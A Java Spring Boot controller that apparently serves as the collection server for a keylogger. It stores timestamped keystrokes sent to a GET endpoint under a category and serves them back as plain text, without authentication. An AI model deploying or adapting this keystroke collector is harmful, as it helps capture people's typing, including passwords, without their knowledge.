package com.hellokoding.springboot.view;

import org.springframework.boot.json.GsonJsonParser;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;

import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.ConcurrentHashMap;

@Controller
public class LogController {

    private static Map<String, Map<Number, String>> keyStrokesMap = new ConcurrentHashMap<>();

    {
        keyStrokesMap.put("default", new TreeMap());
    }

    @GetMapping({"log/{category}/{log}"})
    public void collect(@PathVariable String category, @PathVariable String log) {
        Map<Number, String> buffer = keyStrokesMap.get(category);
        if (buffer == null) {
            buffer = new TreeMap<>();
            keyStrokesMap.put(category, buffer);
        }
        for(Object o : new GsonJsonParser().parseList(log)) {
            Map v = (Map) o;
            buffer.put(Double.parseDouble(v.get("t").toString()), (v.get("k").toString()));
        }

    }

    @GetMapping(value = {"/log/{category}"}, produces = {"text/plain"})
    public ResponseEntity<String> readLogs(@PathVariable String category) {
        Map keyStrokes = keyStrokesMap.get(category);
        StringBuilder buffer = new StringBuilder();
        keyStrokes.values().forEach(v -> buffer.append(v));
        return ResponseEntity.ok(buffer.toString());
    }

    @GetMapping(value = {"/log/categories"}, produces = {"text/plain"})
    public ResponseEntity<String> readCategories() {
        StringBuffer stringBuffer = new StringBuffer();
        keyStrokesMap.keySet().forEach(cat -> stringBuffer.append(cat).append("\n"));
        return ResponseEntity.ok(stringBuffer.toString());
    }
}